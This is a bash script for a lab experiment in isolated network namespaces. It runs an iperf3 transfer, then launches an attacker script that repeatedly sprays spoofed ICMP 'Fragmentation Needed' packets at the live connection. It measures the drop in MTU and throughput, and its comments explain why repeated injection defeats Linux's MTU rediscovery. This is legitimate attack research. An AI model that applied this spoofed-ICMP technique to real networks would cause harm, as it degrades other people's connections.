#!/bin/bash
# Phase P5 — PMTU (throughput reduction) experiment.
#
# Runs a 60s iperf3 bulk transfer client(10.0.0.1) -> server(10.0.0.2).
# After 15s, the attacker starts sniffing the client's own outgoing
# segments and injecting a spoofed ICMP Type 3/Code 4 (Fragmentation
# Needed, next-hop MTU=576) — repeated every few seconds for the rest of
# the transfer, since Linux's own PLPMTUD can otherwise rediscover the
# true path MTU mid-transfer and undo the attack.
#
# Unlike the reset attack (P4), this needs no special socket option on
# the target: ipv4_sk_update_pmtu() applies unconditionally once the
# embedded header matches a live socket and the seq is in-window (see
# build_packets.py's module docstring).
#
# Usage: sudo ./experiments/p5_pmtu_experiment.sh [duration] [inject_at] [mtu]
set -e

if [ "$EUID" -ne 0 ]; then
    echo "Please run as root (sudo ./experiments/p5_pmtu_experiment.sh)" >&2
    exit 1
fi

DURATION="${1:-60}"
INJECT_AT="${2:-15}"
MTU="${3:-576}"
SERVER_PORT=5201
CLIENT_IP="10.0.0.1"
SERVER_IP="10.0.0.2"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ATTACKS_DIR="$(cd "$SCRIPT_DIR/../attacks" && pwd)"
OUT_DIR="$SCRIPT_DIR/results"
mkdir -p "$OUT_DIR"
PCAP="$OUT_DIR/p5_pmtu.pcap"
JSON="$OUT_DIR/p5_pmtu.json"
INJECT_LOG="/tmp/inject_pmtu_out.log"

for ns in client server attacker; do
    ip netns list | grep -qw "$ns" || { echo "Namespace '$ns' not found — run setup_topology.sh first." >&2; exit 1; }
done

cleanup() {
    kill "$TCPDUMP_PID" "$INJECT_PID" 2>/dev/null || true
    wait 2>/dev/null || true
    ip netns exec server pkill -f "iperf3 -s" 2>/dev/null || true
}
trap cleanup EXIT

echo "== Resetting the client's PMTU cache for 10.0.0.2 (clean baseline) =="
ip netns exec client ip route flush cache 2>/dev/null || true
echo "-- before: ip route get --"
ip netns exec client ip route get "$SERVER_IP"

echo
echo "== Starting iperf3 server =="
ip netns exec server pkill -f "iperf3 -s" 2>/dev/null || true
ip netns exec server iperf3 -s -D --logfile /tmp/iperf3_server_p5.log
sleep 1

echo "== Capturing on client's veth-cl (segment sizes + injected ICMP) =="
# -s 96 header-only is enough to read IP total length (segment size) and
# see the ICMP arrive, without the disk cost of full payload capture.
ip netns exec client tcpdump -i veth-cl -s 96 -w "$PCAP" "icmp or (tcp and port $SERVER_PORT)" \
    >/tmp/tcpdump_p5.log 2>&1 &
TCPDUMP_PID=$!
sleep 1

echo "== Starting iperf3 client for ${DURATION}s (client -> server) =="
ip netns exec client iperf3 -c "$SERVER_IP" -t "$DURATION" -i 1 --json > "$JSON" &
IPERF_PID=$!

echo "== Waiting ${INJECT_AT}s before injecting the PMTU attack =="
sleep "$INJECT_AT"

echo "-- before attack: client ss -tin (mss/pmtu) --"
ip netns exec client ss -tin | grep -E "mss|ESTAB" || true

echo
echo "== Attacker: sniffing + spraying spoofed ICMP Type 3/Code 4 (MTU=$MTU) =="
# A single sniffed seq is stale almost instantly against an active bulk
# transfer (its in-window range is only cwnd*mss wide and moving at the
# full transfer rate) — inject_pmtu.py sprays a range of candidates
# instead of guessing once. See its docstring for why.
REMAINING=$((DURATION - INJECT_AT))
[ "$REMAINING" -lt 1 ] && REMAINING=1
ip netns exec attacker python3 "$ATTACKS_DIR/inject_pmtu.py" \
    --server-port "$SERVER_PORT" --mtu "$MTU" --count 1 --timeout 5 \
    --duration "$REMAINING" --interval 5 > "$INJECT_LOG" 2>&1 &
INJECT_PID=$!

echo "== Waiting for the first spray round to land =="
sleep 3
echo "-- after first spray: client ss -tin (mss/pmtu) --"
ip netns exec client ss -tin | grep -E "mss|ESTAB" || true

wait "$IPERF_PID"
wait "$INJECT_PID" 2>/dev/null || true

sleep 1
kill "$TCPDUMP_PID" 2>/dev/null || true
wait "$TCPDUMP_PID" 2>/dev/null || true
ip netns exec server pkill -f "iperf3 -s" 2>/dev/null || true

echo
echo "-- injector output --"
cat "$INJECT_LOG"

echo
echo "== After: ip route get (PMTU cache) =="
ip netns exec client ip route get "$SERVER_IP"

echo
echo "== Per-second throughput (design doc outcome #4) =="
python3 - "$JSON" "$INJECT_AT" <<'PYEOF'
import json, sys

with open(sys.argv[1]) as f:
    data = json.load(f)
inject_at = float(sys.argv[2])

before, after = [], []
for interval in data["intervals"]:
    s = interval["sum"]
    mbps = s["bits_per_second"] / 1e6
    bucket = before if s["start"] < inject_at else after
    bucket.append(mbps)
    marker = "BEFORE" if s["start"] < inject_at else "AFTER "
    print(f"  [{marker}] t={s['start']:5.1f}-{s['end']:5.1f}s  {mbps:6.2f} Mbps")

avg_before = sum(before) / len(before) if before else float("nan")
avg_after = sum(after) / len(after) if after else float("nan")
print()
print(f"Avg before injection: {avg_before:.2f} Mbps")
print(f"Avg after injection:  {avg_after:.2f} Mbps")
if before and after:
    pct = (avg_before - avg_after) / avg_before * 100
    print(f"Change: {pct:+.1f}%")
PYEOF

echo
echo "== TCP segment sizes before/after injection (design doc outcome #3) =="
# tcpdump's own text output (not Scapy) — a minute-long capture at this
# rate is hundreds of thousands of packets, and Scapy's per-packet Python
# object overhead (even with the streaming PcapReader) takes minutes to
# get through that many. tcpdump is a few seconds for the same file.
tcpdump -r "$PCAP" -nn tcp 2>/dev/null | awk -v inject_at="$INJECT_AT" -v client="$CLIENT_IP" '
    BEGIN { t0 = "" }
    $2 == "IP" && index($3, client ".") == 1 && $(NF-1) == "length" && $NF ~ /^[0-9]+$/ {
        split($1, hms, ":")
        t = hms[1]*3600 + hms[2]*60 + hms[3]
        if (t0 == "") t0 = t
        rel = t - t0
        len = $NF
        if (rel < inject_at) { b_n++; b_sum+=len; if (b_n==1 || len<b_min) b_min=len; if (len>b_max) b_max=len }
        else                 { a_n++; a_sum+=len; if (a_n==1 || len<a_min) a_min=len; if (len>a_max) a_max=len }
    }
    END {
        if (b_n) printf "Before injection: n=%d min=%d max=%d avg=%.0f\n", b_n, b_min, b_max, b_sum/b_n
        else print "Before injection: no segments captured"
        if (a_n) printf "After injection : n=%d min=%d max=%d avg=%.0f\n", a_n, a_min, a_max, a_sum/a_n
        else print "After injection : no segments captured"
    }'

echo
echo "== Outcome checklist (design doc Section 5.2) =="
ICMP_SEEN=$(tcpdump -r "$PCAP" -nn icmp 2>/dev/null | wc -l | tr -d ' ')
if [ "$ICMP_SEEN" -gt 0 ]; then
    echo "[1] Spoofed ICMP visible in client capture: YES ($ICMP_SEEN packet(s))"
else
    echo "[1] Spoofed ICMP visible in client capture: NO"
fi
ROUTE_AFTER=$(ip netns exec client ip route get "$SERVER_IP")
if echo "$ROUTE_AFTER" | grep -q "mtu $MTU"; then
    echo "[2] ip route get shows mtu $MTU (PMTU cache updated): YES"
else
    echo "[2] ip route get shows mtu $MTU (PMTU cache updated): NO (route exceptions can expire — see ss -tin output above for the socket-level mss/pmtu, which is the more direct signal)"
fi
echo "[3] TCP segment sizes: see 'before/after injection' summary above (design doc expects a drop to <=$((MTU - 40)) bytes)"
echo "[4] iperf3 throughput: see per-second breakdown above (design doc expects a measurable decrease)"

echo
echo "Raw JSON:  $JSON"
echo "Capture:   $PCAP"
